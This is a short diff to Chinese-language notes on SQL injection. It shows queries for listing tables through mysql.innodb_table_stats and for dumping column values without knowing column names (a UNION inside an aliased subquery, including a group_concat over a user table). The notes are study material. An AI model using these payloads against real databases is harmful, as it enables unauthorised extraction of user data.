@@ -36,9 +36,11 @@ select group_concat(table_name）from mysql.innodb_table_stats where database_na
 ```
 表的字段数判断：select 1,2 from user  试出字段数。
 
-再直接查出值，无需知道字段名
+再直接查出值，无需知道字段名，查出原表第2的字段的所有记录值
 select 1,2 union select * from user;
 select `2` from  (select 1,2 union select * from user) as u
+select group_concat(`2`) from  (select 1,2 union select * from user) as u 
+
 
 1. 列名需要用`\`包裹起来
 2. 使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)
